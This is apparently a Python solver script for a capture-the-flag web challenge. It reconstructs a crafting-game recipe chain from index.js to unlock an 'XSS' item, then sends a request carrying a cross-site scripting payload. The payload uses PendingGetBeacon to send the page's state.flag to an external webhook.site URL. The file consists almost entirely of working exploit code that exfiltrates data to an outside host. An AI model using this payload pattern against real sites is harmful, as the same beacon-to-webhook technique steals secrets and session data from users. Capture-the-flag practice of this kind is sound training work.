
import json
import re
import requests

BASE = "http://chatelaine.cylabacademy.net:31442/"
WEBHOOK = "https://webhook.site/c8c4b827-ed5e-4000-8b53-461f45bfdb7a"

with open("index.js", encoding="utf-8") as f:
    source = f.read()

data = re.search(
    r"const recipes\s*=\s*(\[.*?\]);",
    source,
    re.S
).group(1)

recipes = json.loads(data)

graph = {}
for a, b, result in recipes:
    graph[result] = (a, b)

found = {"Fire", "Water", "Earth", "Air"}
sequence = []

def dfs(target):
    if target in found:
        return

    a, b = graph[target]

    dfs(a)
    dfs(b)

    sequence.append([a, b])
    found.add(target)

dfs("XSS")

xss = (
    "new PendingGetBeacon("
    + json.dumps(WEBHOOK + "?flag=")
    + "+encodeURIComponent(state.flag)).sendNow();"
)

payload = {
    "recipe": sequence,
    "xss": xss
}

print("Steps:", len(sequence))
print("XSS:", xss)


BASE = BASE.rstrip("/")

r = requests.get(
    BASE + "/remoteCraft",
    params={"recipe": json.dumps(payload)},
    allow_redirects=False,
    timeout=15
)

print("URL:", r.request.url)
print("Status:", r.status_code)
print("Response:", r.text)
